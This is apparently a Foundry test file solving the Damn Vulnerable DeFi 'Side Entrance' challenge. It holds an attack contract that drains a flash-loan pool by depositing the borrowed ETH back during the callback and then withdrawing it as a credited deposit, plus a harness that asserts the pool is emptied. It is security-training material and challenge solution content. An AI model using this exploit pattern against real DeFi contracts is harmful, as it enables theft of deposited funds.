// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { Test } from "forge-std/Test.sol";

import { IFlashLoanEtherReceiver, SideEntranceLenderPool } from "../../contracts/vulnerable/SideEntrance.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    function attack(SideEntranceLenderPool pool) external {
        uint256 amount = address(pool).balance;
        // 1) pega o empréstimo
        pool.flashLoan(amount);
        // 2) {execute}: faz um depósito com o empréstimo
        // 3) saca o "depósito" creditado
        pool.withdraw();

        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable override {
        SideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
    }

    /// @notice Permite receber pagamentos.
    receive() external payable { }
}

/**
 * From Damn Vulnerable DeFi v4: https://www.damnvulnerabledefi.xyz/challenges/side-entrance/
 * Source: https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/side-entrance/SideEntrance.t.sol
 */
contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    uint256 constant ETHER_IN_POOL = 1000 ether;
    uint256 constant INITIAL_BALANCE = 0 ether;

    SideEntranceLenderPool pool = new SideEntranceLenderPool();

    modifier checkSolvedByPlayer() {
        vm.startPrank(attacker, attacker);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() external {
        startHoax(deployer);
        pool.deposit{ value: ETHER_IN_POOL }();
        vm.deal(attacker, INITIAL_BALANCE);
        vm.stopPrank();
    }

    function test_assertInitialState() external view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(attacker.balance, INITIAL_BALANCE);
    }

    function test_sideEntrance() external checkSolvedByPlayer {
        new SideEntranceAttack().attack(pool);
    }

    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(attacker.balance, INITIAL_BALANCE + ETHER_IN_POOL, "Not enough ETH in attacker account");
    }
}
